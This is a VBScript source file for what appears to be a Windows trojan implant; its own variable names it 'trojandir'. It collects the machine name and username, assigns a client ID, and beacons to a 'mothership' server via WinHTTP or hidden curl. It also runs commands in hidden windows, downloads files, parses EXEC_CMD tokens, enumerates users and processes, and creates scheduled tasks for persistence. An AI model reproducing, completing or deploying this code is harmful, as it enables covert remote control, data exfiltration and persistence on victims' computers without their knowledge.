Option Explicit
On Error Resume Next


Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim WshShell : Set WshShell = CreateObject("WScript.Shell")
Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")

Function ExtractText(inpingstr, begin_token, end_token)
    
    If XIsEmpty(inpingstr) Then
        Exit Function
    End If
    
    Call LogMsg("ExtractText: " & begin_token & " " & end_token)
    
    ExtractText = ""
    
    Dim start_position : start_position = InStr(1, inpingstr, begin_token, 1)

    if ( start_position <= 0 ) Then
        Exit Function
    end if
    
    Dim end_position : end_position = InStr(1, inpingstr, end_token, 1)        

    start_position = start_position + Len(begin_token)
    
    if ( end_position <= 0 ) or ( start_position >= end_position ) Then
		Exit Function
    End if
    
    ExtractText = Mid(inpingstr, start_position, end_position-start_position)

    if begin_token = "EXEC_CMD_BEGIN" then
        
        if (Mid(ExtractText,1,1) = "|") then
            ExtractText = Mid(ExtractText,2,Len(ExtractText)-1)
        end if

        if (Mid(ExtractText,Len(ExtractText),1) = "|") then
            ExtractText = Mid(ExtractText,1,Len(ExtractText)-1)
        end if
        
    end if
    
    Call LogMsg("ExtractText finished")

End Function

Function TryCopyFile(srcpath, destpath)

    If XIsEmpty(srcpath) or XIsEmpty(destpath) Then
        Exit Function
    End IF
    
    Call LogMsg("TryCopyFile: " & srcpath & " " & destpath)
        
    If Not fso.FileExists(destpath) Then
        fso.CopyFile srcpath, destpath, True
    End IF    
    
    If Not fso.FileExists(destpath) Then
        Call RunShell("conhost.exe --headless cmd /c copy /y " & srcpath & " " & destpath,True)
    End IF

End Function

Function TryDeleteFile(fpath)
    Call LogMsg("TryDeleteFile: " & fpath)
    
    If fso.FileExists(fpath) Then
        fso.DeleteFile fpath, true
    End If
    
    If fso.FileExists(fpath) Then
        Call RunShell("conhost.exe --headless cmd /c del /F /Q " & fpath, True)
    End If
    
End Function

Function XIsEmpty(str)
   
    XIsEmpty = False
    
    If IsNull(str) Or IsEmpty(str) Or Len(Trim(str)) = 0 Then
        XIsEmpty = True   
    End If
    
End Function

Function IsWScript()
    If InStr(LCase(WScript.FullName), "cscript.exe") Then
        IsWScript = false
    Else
        IsWScript = true
    End If
End Function

Function LogErr()
    If Err.Number = 0 Then
        Exit Function
    End IF
    
    Call LogMsg("Err.Number=" & Hex(Err.Number))
    Call LogMsg("Err.Description=" & Err.Description)
    Call LogMsg("Err.Source=" & Err.Source)
End Function

' "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%"
' job_finished
Function PushEventMother(eventcode)
    Call LogMsgMotherT(eventcode,"event")
End Function

Function LogMsgMother(msg)
    Call LogMsgMotherT(msg,"msg")
End Function

Function LogMsgMotherT(msg,tag)  
    On Error Resume Next
    Err.Clear
    
    Dim pp : pp = "LogMsgMotherT"
    If XIsEmpty(tag) Then
        tag = "msg"
    End If
    
    Call LogMsg(pp & ": " & msg & " " & tag)
    
    Dim umsg : umsg = msg
    
    Dim tparams : tparams = GetScriptTagStrUrlDirect()
    tparams = tparams & "&" & URLEncode(tag) & "=" & URLEncode(umsg)
    
    Dim result
    Dim res : res = HttpGet(mothership & "/ow/logmsg.php?" & tparams, result)
    
    If not res then
        Call LogMsg("LogMsgMotherT :: ERROR :: retrying using curl")
        
        Dim params : params =  GetScriptTagStrUrl()        
        params = params & "--data-urlencode" & " " & dq & tag & "=" & umsg & dq
        
        res = RunShell("conhost.exe --headless cmd /c curl -ks -G " & mothership & "/ow/logmsg.php" & " " & params, true)
    End If
    
    If not res then
        Call LogMsg("LogMsgMotherT :: ERROR :: failed to exec get request")
    End If
    
    LogMsgMotherT = res
    
    If Err.Number<>0 Then
        Call LogMsg(pp & " reporting error")
        Call LogErr()
        LogMsgMotherT = False
        Exit Function
    End If
    
    Call LogMsg(pp & " finished")
    
End Function

Function LogMsg(msg)
    
    If XIsEmpty(msg) Then
        Exit Function
    End If
    
    If Not IsWScript() Then
        WScript.Echo msg
    End If

    If Not logfObj is Nothing Then
        logfObj.WriteLine msg
    End If
    
End Function

Function GetProcessName(pid)
    Call LogMsg("GetProcessName: " & CStr(pid))
    
    GetProcessName = ""

    Dim list : Set list = GetProcessList()

    Dim i
    
    For i = 0 to list.Count
        Dim proc : proc = list.Item(i)
        
        if ( proc(1) = pid ) then
            GetProcessName = proc(0)
            Call LogMsg("GetProcessName: procname=" & GetProcessName)

            Exit Function
        End If
        
    Next
    
End Function

Function GetProcessList()
    Call LogMsg("GetProcessList")
    
    Dim list : Set list = CreateObject("Scripting.Dictionary")
    
    Set GetProcessList = list
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("SELECT Name, ProcessId FROM Win32_Process") ' doesn't return all processes

    Dim i : i = 0

    Dim item
    For Each item In colItems
    
        Dim myArray : myArray = Array(item.Name, item.ProcessId)

        list.Add i, myArray

        i = i + 1
    Next

    Set GetProcessList = list
End Function

Function GetTimestamp()
    Dim d, ts
    d = Now
    ts = Year(d) & _
         Right("0" & Month(d), 2) & _
         Right("0" & Day(d), 2) & _
         Right("0" & Hour(d), 2) & _
         Right("0" & Minute(d), 2) & _
         Right("0" & Second(d), 2)

    GetTimestamp = ts
End Function

Function HeadersToDict(responsetext)
    Err.Clear
    
    set HeadersToDict = nothing

    If XIsEmpty(responsetext) Then
        exit function
    End IF
    
    Call LogMsg("HeadersToDict")
    
    Dim headerLines : headerLines = Split(responsetext, vbCrLf)

    Dim myDict
    Set myDict = CreateObject("Scripting.Dictionary")

    Dim line
    For Each line In headerLines
        If Trim(line) <> "" and InStr(line, ":") >= 1 Then
            Dim parts
            parts = Split(line, ":")
            
            If UBound(parts) >= LBound(parts) Then
                Dim keystr : keystr = parts(0)
                
                Dim i : i = 1
                do while myDict.Exists(keystr)
                    keystr = parts(0) & "_" & CStr(i)
                    i = i + 1
                loop
                
                Call LogMsg("keystr: " & keystr & " line: " & line)
                myDict.Add keystr, line
                
            End IF
            
        End If
    Next

    set HeadersToDict = myDict

    Call LogMsg("HeadersToDict -- finished")

End Function

Function DownloadFile(sURL, sFile)
    Dim headers
    DownloadFile = DownloadFileWithHeaders(sURL, sFile, headers)
End Function

Function DownloadFileWithHeaders(sURL, sFile, headers)
    Dim pp : pp = "DownloadFileWithHeaders"
    DownloadFileWithHeaders = False
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(sURL) or XIsEmpty(sFile) Then
        Exit Function
    End If
    
    Call LogMsg(pp & ": " & sURL & " " & sFile & " -- " & GetTimestamp())

    Dim objHTTP, objStream
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", sURL, False
    objHTTP.Send

    Call LogMsg(pp & ": " & objHTTP.Status & " " & objHTTP.StatusText )    
    
    If objHTTP.Status <> 200 Then
        Call LogMsg(pp & ": error: objHTTP.Status is not 200")
        Exit Function
    End If
    

    If XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg(pp & ": ResponseBody is empty")
        Exit Function
    End If
    
   
    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders()
    Call LogMsg(pp & ": header: " & vbCrLf & allHeadersstr & vbCrLf & "--- END ---" & vbCrLf )

    set headers = HeadersToDict(allHeadersstr)

    If not XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg(pp & " writing ResponseBody out to file: " & sFile)

        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' adTypeBinary
        objStream.Open

        Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1

        Call LogMsg(pp & ": ResponseBody byte count: " & CStr(count))
	
        objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
        objStream.SaveToFile sFile, 2 ' adSaveCreateOverWrite (2) overwrites existing file
        objStream.Close
        Set objStream = Nothing

    end if
    
    Set objHTTP = Nothing

	If Err.Number <> 0 Then
		Call LogErr()
		DownloadFileWithHeaders = false
		Exit Function
    End If
	
	DownloadFileWithHeaders = true
    
    Call LogMsg(pp & " finished")
End Function

Function URLEncode(str)
    URLEncode = ""
    
    If XIsEmpty(str) Then
        Exit Function
    End If
    
    Dim i, kchar, code, result
    result = ""
    
    For i = 1 To Len(str)
        kchar = Mid(str, i, 1)
        code = Asc(kchar)
        
        If (code >= 48 And code <= 57) Or _
           (code >= 65 And code <= 90) Or _
           (code >= 97 And code <= 122) Then
            result = result & kchar
        Else
            result = result & "%" & Hex(code)
        End If
    Next
    
    URLEncode = result
    
End Function

Function GetRandom(n)
    GetRandom = ""
    
    If n <= 0 Then
        Exit Function
    End If
    
    Randomize

    Dim min, max, randomNumber

    min = 10000000
    max = 99999999

    GetRandom = ""
    
    Do While Len(GetRandom) < n
        GetRandom = GetRandom & CStr(Int((max - min + 1) * Rnd + min))
    Loop

    GetRandom = Mid(GetRandom, 1, n)
End Function

Function IsEightDigitInteger(strValue)
    Dim regEx
    Set regEx = New RegExp
    ' Pattern: ^ (start), \d{8} (exactly 8 digits), $ (end)
    regEx.Pattern = "^\d{8}$"
    IsEightDigitInteger = regEx.Test(strValue)
End Function

Function Reset(fpath)
    Call LogMsg("Reset " & fpath)
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If

    Call LogMsg("Reset: " & fpath)
    
    fpath = Trim(fpath)
       
    If fso.FileExists(fpath) Then
        fso.DeleteFile(fpath)
    End If
    
    Dim fileObj : Set fileObj = fso.CreateTextFile(fpath, True)
    
				  
 
    fileObj.Close
    Set fileObj = Nothing

									 

    If not fso.FileExists(fpath) Then
        Call RunShell("conhost.exe --headless cmd /c type nul > " & fpath, True)
    End If
    
End Function

Function ReadFile(fpath)
    On Error Resume Next
    Err.Clear
    
    ReadFile = ""
    
    If XIsEmpty(fpath) Then
        Exit Function
    End If
    
    fpath = Trim(fpath)
    
    If Not fso.FileExists(fpath) Then
        Exit Function
    End If
    
    Dim objFile : set objFile = fso.OpenTextFile(fpath, 1)
    
    ReadFile = objFile.ReadAll

    objFile.Close
    Set objFile = Nothing
End Function

Function ReadTag(fpath)
    Call LogMsg("ReadTag " & fpath)

    ReadTag = ReadFile(fpath)
    
    ReadTag = Trim(ReadTag)
    ReadTag = Replace(ReadTag, " ", "")
    ReadTag = Replace(Replace(Replace(ReadTag, vbCr, ""), vbLf, ""), vbTab, "")    

    Call LogMsg("ReadTag " & ReadTag)
    
End Function

Function ReadClientId(clientidpath)
    Dim objFile
    
    ReadClientId = "zzwwxxyy"
    
    If XIsEmpty(clientidpath) Then
        Exit Function
    End If
    
    clientidpath = Trim(clientidpath)
    
    If Not fso.FileExists(clientidpath) Then
        ReadClientId = GetRandom(8)
        
        set objFile = fso.OpenTextFile(clientidpath, 2, True)
        
        objFile.WriteLine(ReadClientId)
        
        objFile.Close
        
        Set objFile = Nothing
        
        Exit Function
    End If
    
    set objFile = fso.OpenTextFile(clientidpath, 1)
    
    Dim clientidstr : clientidstr = objFile.ReadLine

    clientidstr = Replace(Replace(clientidstr, vbCr, ""), vbLf, "")
    clientidstr = Trim(clientidstr)
        
    If IsEightDigitInteger(clientidstr) Then
        ReadClientId = CStr(clientidstr)
    End If
    
    objFile.Close
    Set objFile = Nothing
End Function

Function ExecShellAsync(cmdstr)
    Dim pp : pp = "ExecShellAsync"
    
    If XIsEmpty(cmdstr) Then
        Exit Function
    End If
    
    Call LogMsg(pp & ": " & cmdstr)
    
    Const HIDDEN_WINDOW = 0
    Dim strComputer : strComputer = "."
    Dim strCommand: strCommand = cmdstr

    Dim objWMIService: Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

    Dim objStartup: Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Dim objConfig: Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW

    Dim objProcess: Set objProcess = objWMIService.Get("Win32_Process")

    Dim intPID
    Dim intReturn : intReturn = objProcess.Create(strCommand, Null, objConfig, intPID)

    If intReturn = 0 Then
        Call LogMsg("Process started successfully. PID: " & intPID)
    Else
        Call LogMsg("Process failed to start with error code: " & intReturn)
    End If

    ExecShellAsync = intPID
    
    Call LogMsg(pp & ": finished")
End Function

Function RunShell(cmdstr, sync)
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(cmdstr) Then
        Exit Function
    End If
    
    Call LogMsg("runshell: " & cmdstr)
             
    
    Dim intReturn : intReturn = WshShell.Run(cmdstr, 0, sync)

    Call LogMsg("runshell: intReturn: " & CStr(intReturn))

    If Err.Number <> 0 Then
        RunShell = False
        
        Call LogMsg("runshell: Err.Number: " & Err.Number)
        Call LogMsg("runshell: Err.Source: " & Err.Source)
        Call LogMsg("runshell: Err.Description: " & Err.Description)

        Err.Clear
    End If


    If intReturn = 0 Then
        RunShell = true
    Else
        RunShell = false
    End If
End Function

Function ToTaskTime(startTime)
    
    ' Dim startTime : startTime = Now
    
    ToTaskTime = Year(startTime) & "-" & _
        Right("0" & Month(startTime), 2) & "-" & _
        Right("0" & Day(startTime), 2) & "T" & _
        Right("0" & Hour(startTime), 2) & ":" & _
        Right("0" & Minute(startTime), 2) & ":00"
        
End Function

Function CreateTaskXML(taskname, taskxmlpath)
    
    If XIsEmpty(taskname) Then
        Exit Function
    End IF

    If XIsEmpty(taskxmlpath) Then
        Exit Function
    End IF
    
    Call LogMsg("CreateTaskXML: " & taskname & " " & taskxmlpath)
    
    Dim strCommand : strCommand = "schtasks /create /XML " & dq & taskxmlpath & dq  &" /tn " & dq & taskname & dq & " /F"
    
    Dim ret : ret = RunShell(strCommand, True)

    Call LogMsg("CreateTaskXML: ret: " & CStr(ret))

    CreateTaskXML = ret
End Function

Function GetScriptTag()
    Dim objDict : Set objDict = CreateObject("Scripting.Dictionary")
' anchor
    objDict.Add "clientid", clientid
    objDict.Add "source", source
    objDict.Add "scriptts", scriptts
    objDict.Add "machinename", machinename
    objDict.Add "username", username
    
    if not XIsEmpty(sessionid) Then
        objDict.Add "sessionid", sessionid
    end if

    if not XIsEmpty(jobcode) Then
        objDict.Add "jobcode", jobcode
    end if

    if not XIsEmpty(batchid) Then
        objDict.Add "batchid", batchid
    end if
    
    Set GetScriptTag = objDict
End Function

Function GetScriptTagStrUrlDirect()
    GetScriptTagStrUrlDirect = ""
    
    Dim scripttag : Set scripttag = GetScriptTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

	Dim i : i = 0
    For Each strKey In keys
		
		If i = 0 Then
			GetScriptTagStrUrlDirect = URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
		Else
			GetScriptTagStrUrlDirect = GetScriptTagStrUrlDirect & "&" & URLEncode(strKey) & "=" & URLEncode(scripttag.Item(strKey))
		End IF
		
		i = i + 1
    Next

End Function

Function GetScriptTagStrUrl()
    GetScriptTagStrUrl = ""
    
    Dim scripttag : Set scripttag = GetScriptTag()
    
    Dim keys : keys = scripttag.Keys
    Dim strKey

	' --data-urlencode "source=zfei.vbs" 
    For Each strKey In keys
		GetScriptTagStrUrl = GetScriptTagStrUrl & " --data-urlencode " & dq & strKey & "=" & scripttag.Item(strKey) & dq & " "
    Next

End Function

Function GetScriptPID()
    GetScriptPID = -1
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim WshShell : Set WshShell = CreateObject("WScript.Shell")

    Dim strUniqueTitle : strUniqueTitle = "GetPID_" & Timer()
    Dim strCommand : strCommand = "cmd /c title " & strUniqueTitle & " & timeout 5"

    wshShell.Run strCommand, 0, False
    WScript.Sleep 100 

    Dim strQuery : strQuery = "SELECT ParentProcessId FROM Win32_Process WHERE CommandLine LIKE '%" & strUniqueTitle & "%'"
    Dim colItems : Set colItems = objWMIService.ExecQuery(strQuery)

    Dim objItem
    For Each objItem In colItems
        GetScriptPID = objItem.ParentProcessId
    Next

End Function

Function GetLocalUsers()
    GetLocalUsers = ""
    
    Dim objWMIService : Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Dim colItems : Set colItems = objWMIService.ExecQuery("Select * from Win32_UserAccount Where LocalAccount = True")

    Dim isempty : isempty = False
    
    If colItems Is Nothing Then
        isempty = True
    ElseIf colItems.Count = 0 Then
        isempty = True
    End IF
    
    If isempty Then
        Exit Function
    End IF
    
    Dim objItem
    For Each objItem in colItems
        GetLocalUsers = GetLocalUsers & objItem.Name & "|"
    Next

End Function

Function FileExists(dirpath, fname)
    FileExists = False
    
    If fso.FolderExists(dirpath) Then
        Dim folder : Set folder = fso.GetFolder(dirpath)
        
        Dim file
        For Each file In folder.Files 
            If LCase(file.Name) = LCase(fname) Then
                FileExists = True
                Exit Function
            End If
        Next
        
    End If
    
End Function

Function WriteFile(fpath, msgstr)
    If XIsEmpty(msgstr) Then
        msgstr = ""
    End If
    
    Call LogMsg("WriteFile: " & fpath)
    
    Const ForWriting = 2
    Const CreateIfNotExist = True

    Dim oFile : Set oFile = fso.OpenTextFile(fpath, ForWriting, CreateIfNotExist)

    oFile.Write msgstr

    oFile.Close
    Set oFile = Nothing

End Function

Function HttpGet(urlstr, ByRef result)
    Dim pp : pp = "HttpGet"
    HttpGet = False
    
    On Error Resume Next
    Err.Clear
    
    If XIsEmpty(urlstr) Then
        Exit Function
    End If
    
    Call LogMsg(pp & ": " & urlstr)

    Set result = CreateObject("Scripting.Dictionary")
    
    Dim objHTTP, objStream
    
    Call LogMsg(pp & " sending request...")
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", urlstr, False

    objHTTP.Send

    Call LogMsg(pp & ": status: " & objHTTP.Status & " " & objHTTP.StatusText )    
    
    If XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg("HttpGet: ResponseBody is empty")        
    End If
        
    Dim allHeadersstr : allHeadersstr = objHTTP.getAllResponseHeaders() & vbCrLf
    Call LogMsg(pp & ": headers: " & vbCrLf & allHeadersstr & vbCrLf )

    result.Add "headers", allHeadersstr
    
    If Not XIsEmpty(objHTTP.ResponseBody) Then
        Call LogMsg(pp & ": writing ResponseBody to memory" )

        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' adTypeBinary
        objStream.Open

        Dim count : count = UBound(objHTTP.ResponseBody) - LBound(objHTTP.ResponseBody) + 1

        result.Add "bodybytecount", count

        Call LogMsg(pp & ": ResponseBody byte count: " & CStr(count))
        
        objStream.Write objHTTP.ResponseBody ' objHTTP.ResponseText    
       
        result.Add "ResponseBody", objStream.Read
        
        objStream.Close
        Set objStream = Nothing    
    End If
    
    Set objHTTP = Nothing

	If Err.Number <> 0 Then
        Call LogMsg(pp & " logging error")

        result.Add "error", Err.Number
        
		Call LogErr()
		HttpGet = false
		Exit Function
    End If
    
    HttpGet = true

    Call LogMsg(pp & " finished")

End Function

' --- BEGIN: globals static initialization

Dim appDataPath : appDataPath = WshShell.ExpandEnvironmentStrings("%APPDATA%")

Dim dq : dq = Chr(34)
Dim tempPath : tempPath = fso.GetSpecialFolder(2)

Dim sessionid : sessionid = GetRandom(8) 
Dim batchid : batchid = sessionid

Dim scriptts : scriptts = GetTimestamp()
Dim clientid : clientid = "abcdwxyz"
Dim source : source = WScript.ScriptName
Dim scriptpath : scriptpath = WScript.ScriptFullName
Dim machinename : machinename = "LOCALHOST"
Dim username : username = "UNKNOWNUSER"

If Not objNetwork Is Nothing Then
    machinename = objNetwork.ComputerName
    username = objNetwork.UserName
End If

tempPath = "C:\ProgramData\owdtpl"

Dim trojandir : trojandir = tempPath
Dim workdir : workdir = tempPath & "\cmdlist_vbs_" & scriptts

If Not fso.FolderExists(workdir) Then
    Call fso.CreateFolder(workdir)
End IF

Dim scriptfname : scriptfname = source

Dim logfpath: logfpath = workdir & "\" & scriptfname & "_" & scriptts & ".log"
Dim logfObj : Set logfObj = fso.OpenTextFile(logfpath, 8, True)

Dim lockfilepath : lockfilepath = workdir & "\" & scriptfname & ".lock"
Dim lockfileObj 

' --- END

Function Init()
    On Error Resume Next
    Err.Clear
    
    Call LogMsg("Init")
    
    If Not fso.FolderExists(workdir) Then
        fso.CreateFolder(workdir)
    End If

    WshShell.CurrentDirectory = workdir

    Call LogMsg("attempting to obtain lock")
    
    Err.Clear

    Call TryDeleteFile(lockfilepath)
    
    Call LogErr()
    
    If Err.Number <> 0 Or fso.FileExists(lockfilepath) Then
        Call LogMsg("singleton rule -- unable to delete lock file, exiting")
        WScript.Quit(1)
    Else
        
        Set lockfileObj = fso.OpenTextFile(lockfilepath, 8, True)
        Call lockfileObj.WriteLine("locked")

    End If
            

    If fso.FileExists(trojandir & "\" & "mothership") Then
        Call LogMsg("mothership exists reading it")
        ' mothership = ReadTag( trojandir & "\" & "mothership" )
    End If
        
    clientid = ReadClientId(trojandir & "\" & "client_id")
    
    Call LogMsg("starting source=" & source & " clientid=" & clientid & " mothership=" & mothership & " -- " & scriptts )

    Call LogMsgMother("hello world test 2.7182818284")
    
    Call LogMsg("Init -- reporting errors if any")
    Call LogErr()
    
    Call LogMsg("exiting")
    WScript.Quit(0)
    
End Function

Init()

Call LogErr()
Call LogMsg("fatal error -- reached unreachable point -- exiting")
WScript.Quit(1)